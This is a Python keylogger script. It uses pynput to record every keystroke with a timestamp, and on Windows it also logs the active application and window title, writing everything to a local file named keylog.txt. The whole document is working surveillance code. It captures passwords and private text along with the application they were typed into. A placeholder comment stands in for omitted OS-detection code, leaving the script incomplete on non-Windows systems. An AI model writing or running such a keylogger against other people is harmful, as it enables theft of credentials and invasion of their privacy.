from pynput import keyboard
import datetime
import platform

# [OS detection code remains the same...]

if platform.system() == "Windows":
    import win32gui
    import win32process
    import psutil


    def get_active_window():
        try:
            window = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(window)[1]
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(window)
            return f"{process.name()} - {window_title}"
        except:
            return "Unknown"

log_file = "keylog.txt"
current_window = ""


def on_press(key):
    global current_window

    active_window = get_active_window()

    if active_window != current_window:
        current_window = active_window
        with open(log_file, "a", encoding="utf-8") as f:  # Added encoding
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n{'=' * 60}\n")
            f.write(f"[{timestamp}] APPLICATION: {current_window}\n")
            f.write(f"{'=' * 60}\n")

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        with open(log_file, "a", encoding="utf-8") as f:  # Added encoding
            f.write(f"[{timestamp}] {key.char}\n")
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:  # Added encoding
            if key == keyboard.Key.space:
                f.write(f"[{timestamp}] [SPACE]\n")
            elif key == keyboard.Key.enter:
                f.write(f"[{timestamp}] [ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write(f"[{timestamp}] [TAB]\n")
            elif key == keyboard.Key.backspace:
                f.write(f"[{timestamp}] [BACKSPACE]\n")
            else:
                f.write(f"[{timestamp}] {key}\n")


print("Keylogger started. Press Ctrl+C to stop.")
print(f"Logging to: {log_file}")

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nKeylogger stopped.")